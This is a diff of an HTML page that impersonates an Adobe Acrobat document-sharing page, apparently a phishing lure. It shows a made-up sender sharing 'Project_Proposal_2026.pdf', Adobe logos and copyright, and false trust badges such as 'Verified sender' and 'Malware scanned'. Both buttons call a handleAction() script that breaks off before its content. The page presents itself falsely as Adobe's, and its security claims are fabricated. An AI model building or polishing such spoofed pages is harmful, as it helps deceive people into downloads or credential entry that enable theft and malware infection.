@@ -3,267 +3,502 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Acrobat - Secure Download</title>
+    <title>Adobe Acrobat - Shared with you</title>
     <link rel="icon" href="https://www.adobe.com/favicon.ico">
     <style>
         @page { size: A4; margin: 0; }
 
-        * {
+        *, *::before, *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
         body {
-            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f5;
+            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f4f4f8;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
 
-        /* Header */
-        .header {
-            background: #2c2c2c;
-            padding: 14px 28px;
+        /* ─── Header ─── */
+        .site-header {
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            height: 56px;
             display: flex;
             align-items: center;
-            gap: 10px;
+            justify-content: space-between;
+            padding: 0 32px;
         }
 
-        .header svg {
-            width: 28px;
-            height: 24px;
+        .site-header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
         }
 
-        .header-text {
-            color: #ffffff;
-            font-size: 15px;
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .brand svg {
+            width: 26px;
+            height: 22px;
+        }
+
+        .brand-text {
+            font-size: 16px;
             font-weight: 700;
+            color: #1a1a1a;
         }
 
-        /* Center */
-        .center {
+        .brand-text span {
+            font-weight: 400;
+            color: #888;
+        }
+
+        .header-sep {
+            width: 1px;
+            height: 24px;
+            background: #e0e0e0;
+        }
+
+        .shared-label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .shared-label svg {
+            width: 16px;
+            height: 16px;
+            stroke: #666;
+        }
+
+        .site-header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header-link {
+            font-size: 13px;
+            color: #1473e6;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 6px 12px;
+            border-radius: 6px;
+            transition: 0.15s;
+        }
+
+        .header-link:hover {
+            background: #f0f7ff;
+        }
+
+        /* ─── Main Content ─── */
+        .main {
             flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 48px 20px;
+            padding: 48px 24px;
         }
 
-        .card {
-            background: #ffffff;
+        .share-card {
+            background: #fff;
             border-radius: 16px;
-            box-shadow: 0 2px 24px rgba(0, 0, 0, 0.06);
-            max-width: 500px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.06), 0 8px 32px rgba(0,0,0,0.06);
+            max-width: 720px;
             width: 100%;
-            padding: 44px 40px;
-            text-align: center;
+            overflow: hidden;
         }
 
-        /* Large icon */
-        .big-icon {
-            width: 88px;
-            height: 104px;
-            margin: 0 auto 28px;
-        }
-
-        .card h1 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #2c2c2c;
-            margin-bottom: 8px;
-        }
-
-        .card .subtitle {
-            font-size: 14px;
-            color: #6e6e6e;
-            line-height: 1.5;
-            margin-bottom: 32px;
-        }
-
-        /* Info rows */
-        .info-table {
-            width: 100%;
-            margin-bottom: 32px;
-            border-collapse: collapse;
-        }
-
-        .info-table td {
-            padding: 12px 16px;
-            font-size: 13px;
+        /* Sender info bar */
+        .sender-bar {
+            padding: 20px 32px;
             border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            align-items: center;
+            gap: 14px;
         }
 
-        .info-table td:first-child {
-            color: #8a8a8a;
-            text-align: left;
-            font-weight: 500;
-        }
-
-        .info-table td:last-child {
-            color: #2c2c2c;
-            text-align: right;
+        .sender-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #1473e6;
+            color: #fff;
+            font-size: 15px;
             font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
         }
 
-        .info-table tr:last-child td {
-            border-bottom: none;
+        .sender-info {
+            flex: 1;
         }
 
-        /* Button */
-        .btn-download {
-            width: 100%;
+        .sender-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+
+        .sender-email {
+            font-size: 12px;
+            color: #888;
+            margin-top: 1px;
+        }
+
+        .share-date {
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        /* Document preview area */
+        .preview-row {
+            display: flex;
+            padding: 28px 32px;
+            gap: 28px;
+        }
+
+        /* Miniature page preview */
+        .doc-preview {
+            width: 200px;
+            height: 260px;
+            background: #fafafa;
+            border: 1px solid #e8e8e8;
+            border-radius: 8px;
+            padding: 20px 18px;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 7px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .doc-preview .preview-line {
+            height: 5px;
+            background: #e0e0e0;
+            border-radius: 3px;
+        }
+
+        .doc-preview .preview-line.head {
+            height: 8px;
+            width: 55%;
+            background: #c8c8c8;
+            margin-bottom: 6px;
+        }
+
+        .doc-preview .preview-line.w92 { width: 92%; }
+        .doc-preview .preview-line.w85 { width: 85%; }
+        .doc-preview .preview-line.w78 { width: 78%; }
+        .doc-preview .preview-line.w95 { width: 95%; }
+        .doc-preview .preview-line.w65 { width: 65%; }
+        .doc-preview .preview-line.w88 { width: 88%; }
+
+        .preview-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
             background: #EB1000;
-            color: #ffffff;
+            color: #fff;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 3px 7px;
+            border-radius: 4px;
+            letter-spacing: 0.5px;
+        }
+
+        .preview-page-label {
+            position: absolute;
+            bottom: 8px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 10px;
+            color: #bbb;
+        }
+
+        /* Document details */
+        .doc-details {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .doc-details h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+
+        .doc-details .doc-type {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 20px;
+        }
+
+        .meta-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .meta-item {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .meta-label {
+            font-size: 11px;
+            color: #aaa;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 3px;
+        }
+
+        .meta-value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .doc-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-dl {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #1473e6;
+            color: #fff;
             border: none;
-            border-radius: 24px;
-            padding: 16px 28px;
-            font-size: 16px;
+            border-radius: 22px;
+            padding: 12px 28px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-dl:hover {
+            background: #0d66d0;
+        }
+
+        .btn-dl svg {
+            width: 17px;
+            height: 17px;
+        }
+
+        .btn-open {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: transparent;
+            color: #1473e6;
+            border: 1.5px solid #1473e6;
+            border-radius: 22px;
+            padding: 11px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-open:hover {
+            background: #f0f7ff;
+        }
+
+        .btn-open svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Trust bar */
+        .trust-bar {
+            background: #f9f9fb;
+            border-top: 1px solid #f0f0f0;
+            padding: 14px 32px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: background 0.2s ease, box-shadow 0.2s ease;
-            text-decoration: none;
-        }
-
-        .btn-download:hover {
-            background: #c40d00;
-            box-shadow: 0 4px 20px rgba(235, 16, 0, 0.25);
-        }
-
-        .btn-download svg {
-            width: 20px;
-            height: 20px;
-        }
-
-        /* Trust badges */
-        .trust-row {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 16px;
-            margin-top: 24px;
+            gap: 24px;
             flex-wrap: wrap;
         }
 
-        .trust-badge {
+        .trust-item {
             display: flex;
             align-items: center;
-            gap: 5px;
-            font-size: 11px;
-            color: #8a8a8a;
+            gap: 6px;
+            font-size: 12px;
+            color: #888;
         }
 
-        .trust-badge svg {
+        .trust-item svg {
             width: 14px;
             height: 14px;
         }
 
-        .trust-badge.green svg { fill: #4caf50; }
-        .trust-badge.gray svg { fill: #8a8a8a; }
+        .trust-item.verified svg { fill: #2e7d32; }
+        .trust-item.encrypted svg { fill: #888; }
+        .trust-item.scanned svg { fill: #2e7d32; }
 
-        /* Footer */
-        .footer {
-            padding: 18px;
+        /* ─── Footer ─── */
+        .site-footer {
             text-align: center;
+            padding: 18px 24px;
             font-size: 11px;
-            color: #b3b3b3;
+            color: #bbb;
         }
 
-        .footer a { color: #b3b3b3; text-decoration: none; }
-        .footer a:hover { text-decoration: underline; }
+        .site-footer a { color: #bbb; text-decoration: none; }
+        .site-footer a:hover { text-decoration: underline; }
 
-        /* Print / PDF styles */
+        /* Print */
         @media print {
-            body { background: #ffffff; }
-            .header { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
-            .card { box-shadow: none; border: 1px solid #e0e0e0; }
-            .btn-download { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
-            .trust-badge svg { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            body { background: #fff; }
+            .share-card { box-shadow: none; border: 1px solid #e0e0e0; }
+            .btn-dl, .btn-open, .trust-item svg, .sender-avatar, .preview-badge { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
         }
     </style>
 </head>
 <body>
     <!-- Header -->
-    <div class="header">
-        <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
-            <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
-            <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
-        </svg>
-        <span class="header-text">Adobe Acrobat</span>
+    <div class="site-header">
+        <div class="site-header-left">
+            <div class="brand">
+                <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
+                    <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
+                    <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
+                </svg>
+                <div class="brand-text">Adobe Acrobat <span>| Document Cloud</span></div>
+            </div>
+            <div class="header-sep"></div>
+            <div class="shared-label">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+                Shared with you
+            </div>
+        </div>
+        <div class="site-header-right">
+            <a href="#" class="header-link">Sign in</a>
+        </div>
     </div>
 
-    <!-- Center -->
-    <div class="center">
-        <div class="card">
-            <!-- Large PDF icon -->
-            <svg class="big-icon" viewBox="0 0 88 104" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M0 8C0 3.58 3.58 0 8 0H56L88 32V96C88 100.42 84.42 104 80 104H8C3.58 104 0 100.42 0 96V8Z" fill="#FFF0EF"/>
-                <path d="M56 0L88 32H64C59.58 32 56 28.42 56 24V0Z" fill="#FFCCC8"/>
-                <rect x="18" y="60" rx="3" width="52" height="6" fill="#FFD4D1"/>
-                <rect x="18" y="72" rx="3" width="40" height="6" fill="#FFD4D1"/>
-                <rect x="18" y="84" rx="3" width="46" height="6" fill="#FFD4D1"/>
-                <text x="44" y="48" text-anchor="middle" fill="#EB1000" font-size="18" font-weight="700" font-family="sans-serif">PDF</text>
-            </svg>
-
-            <h1>Your PDF is ready</h1>
-            <p class="subtitle">The document has been processed and verified. Click below to download.</p>
-
-            <table class="info-table">
-                <tr>
-                    <td>File name</td>
-                    <td>Project_Proposal.pdf</td>
-                </tr>
-                <tr>
-                    <td>Size</td>
-                    <td>5.3 MB</td>
-                </tr>
-                <tr>
-                    <td>Pages</td>
-                    <td>22</td>
-                </tr>
-                <tr>
-                    <td>Format</td>
-                    <td>PDF 2.0</td>
-                </tr>
-            </table>
-
-            <button class="btn-download" onclick="handleAction()">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
-                    <polyline points="7 10 12 15 17 10"/>
-                    <line x1="12" y1="15" x2="12" y2="3"/>
-                </svg>
-                Download PDF
-            </button>
-
-            <div class="trust-row">
-                <div class="trust-badge green">
-                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                    Verified document
+    <!-- Main -->
+    <div class="main">
+        <div class="share-card">
+            <!-- Sender bar -->
+            <div class="sender-bar">
+                <div class="sender-avatar">RM</div>
+                <div class="sender-info">
+                    <div class="sender-name">Rachel Martinez shared a file with you</div>
+                    <div class="sender-email">r.martinez@company.com</div>
                 </div>
-                <div class="trust-badge gray">
+                <span class="share-date">Apr 14, 2026</span>
+            </div>
+
+            <!-- Document preview row -->
+            <div class="preview-row">
+                <div class="doc-preview">
+                    <span class="preview-badge">PDF</span>
+                    <div class="preview-line head"></div>
+                    <div class="preview-line w95"></div>
+                    <div class="preview-line w92"></div>
+                    <div class="preview-line w85"></div>
+                    <div class="preview-line w95"></div>
+                    <div class="preview-line w78"></div>
+                    <div style="height:8px"></div>
+                    <div class="preview-line head" style="width:40%"></div>
+                    <div class="preview-line w92"></div>
+                    <div class="preview-line w88"></div>
+                    <div class="preview-line w95"></div>
+                    <div class="preview-line w65"></div>
+                    <div style="height:8px"></div>
+                    <div class="preview-line w95"></div>
+                    <div class="preview-line w88"></div>
+                    <div class="preview-line w78"></div>
+                    <span class="preview-page-label">Page 1 of 22</span>
+                </div>
+
+                <div class="doc-details">
+                    <h2>Project_Proposal_2026.pdf</h2>
+                    <div class="doc-type">PDF Document &middot; Shared via Adobe Document Cloud</div>
+
+                    <div class="meta-grid">
+                        <div class="meta-item">
+                            <span class="meta-label">File Size</span>
+                            <span class="meta-value">5.3 MB</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">Pages</span>
+                            <span class="meta-value">22</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">Format</span>
+                            <span class="meta-value">PDF 2.0</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">Protection</span>
+                            <span class="meta-value">Encrypted (AES-256)</span>
+                        </div>
+                    </div>
+
+                    <div class="doc-actions">
+                        <button class="btn-dl" onclick="handleAction()">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                            Download PDF
+                        </button>
+                        <button class="btn-open" onclick="handleAction()">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+                            Open in Acrobat
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Trust bar -->
+            <div class="trust-bar">
+                <div class="trust-item verified">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    Verified sender
+                </div>
+                <div class="trust-item encrypted">
                     <svg viewBox="0 0 24 24"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
-                    Encrypted
+                    Encrypted transfer
                 </div>
-                <div class="trust-badge green">
+                <div class="trust-item scanned">
                     <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                    Scanned
+                    Malware scanned
+                </div>
+                <div class="trust-item">
+                    <svg viewBox="0 0 24 24" fill="#888"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                    Available for 30 days
                 </div>
             </div>
         </div>
     </div>
 
     <!-- Footer -->
-    <div class="footer">
+    <div class="site-footer">
         &copy; 2026 Adobe. All rights reserved. &middot;
         <a href="#">Privacy</a> &middot;
-        <a href="#">Terms of Use</a>
+        <a href="#">Terms of Use</a> &middot;
+        <a href="#">Cookie preferences</a>
     </div>
 
     <script>
